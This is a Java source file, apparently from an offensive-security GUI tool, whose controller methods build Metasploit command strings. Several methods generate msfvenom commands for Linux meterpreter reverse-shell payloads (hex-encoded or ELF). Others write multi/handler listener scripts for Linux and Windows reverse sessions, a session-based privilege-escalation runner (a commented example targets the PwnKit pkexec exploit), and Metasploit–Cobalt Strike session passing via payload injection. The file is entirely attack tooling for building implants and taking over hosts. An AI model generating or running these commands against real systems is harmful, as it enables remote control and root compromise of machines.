package com.swordHostDemo.controller;

import com.swordHostDemo.pojo.MenuBean;

/**
 * @date: 2022/12/27 20:24
 * @description:
 */
public class MetasploitController extends MenuBean {

    public static String MsflinuxHexCommand(String lhost, String lport) {
        //linuxhex
        String linuxHex = "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="+lhost+ " LPORT="+lport+" -e x64/xor -b '\\x00' -f hex";
        return linuxHex;
    }
    public static String MsflinuxELFCommand(String lhost, String lport,String filename) {
        //linuxhex
        String linuxElf = "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="+lhost+ " LPORT="+lport+" -f elf -o "+filename;
        return linuxElf;
    }
    public static String ListenerLinuxhandler(String lhost, String lport){
        String lisStringCom = "use exploit/multi/handler\n" +
                "set payload linux/x64/meterpreter/reverse_tcp\n" +
                "set lhost "+lhost+"\n" +
                "set lport "+lport+"\n" +
                "exploit";
        return lisStringCom;
    }
    public static String ListenerWindowshandler(String lhost, String lport){
        String lisStringCom = "use exploit/multi/handler\n" +
                "set payload windows/meterpreter/reverse_http\n" +
                "set lhost "+lhost+"\n" +
                "set lport "+lport+"\n" +
                "exploit";
        return lisStringCom;
    }
    public static String RootCommand(String payload,String lhost,String lport,String sessionID){
        String lisStringCom =
                "use "+payload+"\n" +
                "set session "+sessionID+"\n" +
                "set lhost "+lhost+"\n" +
                "set lport "+lport+"\n" +
                "exploit";
        return lisStringCom;
    }
    

    public static String CsMsfForeignCommand(String lhost,String lport){

        String CsMsfForeign = "use exploit/multi/handler\n" +
                "set payload windows/meterpreter/reverse_http\n" +
                "set lhost "+lhost+"\n" +
                "set lport "+lport+" \n" +
                "exploit";

        return CsMsfForeign;
    }

    public static String MsfCsForeignCommand(String lhost,String lport){

        String MsfCsForeign = "use exploit/windows/local/payload_inject\n" +
                "set payload windows/meterpreter/reverse_http\n" +
                "set DisablePayloadHandler true\n" +
                "set lhost "+lhost+"\n" +
                "set lport "+lport+" \n" +
                "set session 122 \n" +
                "exploit";

        return MsfCsForeign;
    }





//    public static void main(String[] args) {
//        System.out.println(ListenerLinuxhandler("123", "123"));
//        System.out.println(ListenerWindowshandler("123", "123"));
//        System.out.println(RootCommand("exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec","1234","1234","2"));
//    }



}
